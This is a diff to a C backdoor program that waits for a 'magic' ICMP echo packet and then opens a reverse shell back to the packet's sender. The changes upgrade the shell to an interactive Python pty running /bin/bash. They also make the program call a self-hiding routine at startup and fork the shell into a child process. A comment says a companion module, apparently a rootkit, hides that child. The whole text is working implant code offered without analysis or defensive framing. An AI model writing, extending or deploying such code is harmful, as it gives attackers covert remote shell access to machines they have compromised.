@@ -22,8 +22,9 @@ void reverse_shell(in_addr_t s_addr) {
 	dup2(sockt, 1);
 	dup2(sockt, 2);
 
-	char *const argv[] = { "/bin/bash", NULL };
-	execve("/bin/bash", argv, NULL);
+	//we already know python is installed
+	char *const argv[] = { "python3", "-c", "import pty, os; os.putenv('TERM','xterm'); os.system('clear'); pty.spawn('/bin/bash')", NULL };
+	execve("/usr/bin/python3", argv, NULL);
 }
 void hide_self() {
 	char buffer[16];
@@ -31,6 +32,7 @@ void hide_self() {
 	system(buffer);
 }
 int main() {
+	hide_self();
 	char buffer[1024];
 	int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
 	while (1) {
@@ -40,8 +42,14 @@ int main() {
 		struct icmphdr *icmp = (void *)(buffer + ip->ihl * 4);
 		if (icmp->type != ICMP_ECHO) continue;
 		char *payload = (void *)(icmp + 1);
-		if (!memcmp(payload, MAGIC_PACKET, sizeof(MAGIC_PACKET)-1))
-			reverse_shell(ip->saddr);
+		if (!memcmp(payload, MAGIC_PACKET, sizeof(MAGIC_PACKET)-1)) {
+			pid_t pid = fork();
+			if (!pid) {
+				//the module hides the child process as well
+				reverse_shell(ip->saddr);
+				_exit(0);
+			}
+		}
 	}
 }
 
